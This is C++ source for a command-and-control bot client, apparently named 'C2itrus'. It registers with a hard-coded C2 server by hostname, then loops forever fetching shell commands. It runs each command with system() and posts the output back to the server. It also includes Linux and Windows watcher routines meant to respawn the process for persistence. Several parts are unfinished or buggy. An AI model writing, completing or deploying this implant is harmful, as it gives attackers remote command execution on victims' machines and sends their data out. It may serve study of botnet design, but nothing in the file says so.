#include <iostream>
#include <string>
#include <csignal>
#include <vector>
#include <fstream>
#include <thread>
#include <list>

#include <curl/curl.h>
#include <cstdio>

//#include <curlpp/cURLpp.hpp>
//#include <curlpp/Easy.hpp>
//#include <curlpp/Options.hpp>

#include <rapidjson/document.h>

#if defined C2ITRUS_LINUX
#include <unistd.h>
#endif

#if defined C2ITRUS_WINDOWS
#include <windows.h>
#endif

std::string c2_url = "http://10.13.160.97:5000/bot/register/";

std::string process_name;

std::string get_host_name() {
    const std::size_t buffer_size = 4 * 1024;
    char buffer[buffer_size];
    gethostname(buffer, buffer_size);
    return std::string{buffer};
}

size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    auto& str = *reinterpret_cast<std::string*>(userp);
    str.append((char*)contents, size* nmemb);
    return size * nmemb;
}

size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp) {
    //TODO: Complete
}

[[noreturn]]
void client_work() {
    auto hostname = get_host_name();

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl_easy_init failed" << std::endl;
    }

    c2_url += hostname;

    std::string raw_json;

    curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    auto result = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    //std::cout << "Data:" << read_data << std::endl;

    if (result != CURLE_OK) {
        std::cerr << "POST request failed" << std::endl;
        std::cerr << curl_easy_strerror(result);
        exit(EXIT_FAILURE);
    }

    curl_easy_reset(curl);

    //Issue GET request for uuid;
    curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);

    rapidjson::Document document;
    document.Parse(raw_json.c_str());
    std::string uuid = document["uuid"].GetString();

    std::cout << "UUID: " << uuid << std::endl;

    //Write UUID to config file
    FILE* fout = fopen("~/.config/c3.txt", "w+");
    if (!fout) {
        std::cerr << "Failed to open ~/.config/c3.txt" << std::endl;
        std::cerr << strerror(errno) << std::endl;
        errno = 0;
        exit(EXIT_FAILURE);
    }
    fwrite(uuid.c_str(), sizeof(char), uuid.size(), fout);
    fflush(fout);

    while (true) {
        //Issue get request for work

        std::string command;

        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command);
        curl_easy_perform(curl);

        //Pipe output of command to file
        command += " > ./output.txt";

        //Execute work
        system(command.c_str());

        //TODO: Return output.txt

        //Read in data from file to temporary buffer
        std::vector<unsigned char> bytes;
        FILE* fin = fopen("./output.txt", "r");
        fseek(fin, 0l, SEEK_END);
        auto file_size = ftell(fin);
        rewind(fin);

        bytes.resize(file_size);
        fread(bytes.data(), sizeof(unsigned char), file_size, fin);

        //Issue post request for results
        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, bytes.data());
        curl_easy_perform(curl);
    }
}

#if defined C2ITRUS_LINUX
[[noreturn]]
void watcher_work() {
    while (true) {
        int parent_pid;
        do {
            parent_pid = getppid();
            sleep(100);
        } while (parent_pid != 1);

        //TODO: Fix this because it's probably not going to work

        //This process becomes the new worker
        execl(process_name.c_str(), process_name.c_str(), (char*)nullptr);
    }
}
#endif

#if defined C2ITRUS_WINDOWS

[[noreturn]]
void watcher_work() {
    while (true) {
        STARTUPINFO startup_info;

        PROCESS_INFORMATION process_info;

        createProcess(
            nullptr,
            process_name.c_str(),
            nullptr,
            nullptr,
            false,
            0,
            nullptr,
            nullptr,
            &startup_info,
            &process_info
        );



        /*
        int parent_pid;
        do {
            parent_pid = getppid();
            sleep(100);
        } while (parent_pid != 1);

        //Try to start process again
        while (system(process_name.c_str()) == 0);
        */
    }
}
#endif

void add_watcher() {
    #if defined C2ITRUS_LINUX
    int pid = fork();
    if (pid == 0) {
        watcher_work();
    }
    #endif
}

void term_handler(int signal) {
    std::cerr << "SIGTERM signal caught" << std::endl;
}

void spawn_workers(unsigned i) {
    if (i == 0) {
        return;
    }

    if (0 == fork()) {
        spawn_workers(i - 1);
    }
}

int main(int argc, char* argv[]) {
    //signal(SIGTERM, term_handler);

    process_name = argv[0];

    //unsigned num_workers = std::thread::hardware_concurrency();
    //if (argc > 1) {
    //    num_workers = std::atoi(argv[1]);
    //}
    //spawn_workers(num_workers);

    //Add watcher
    //add_watcher();

    client_work();

    std::cout << "Hello, World!" << std::endl;
    return 0;
}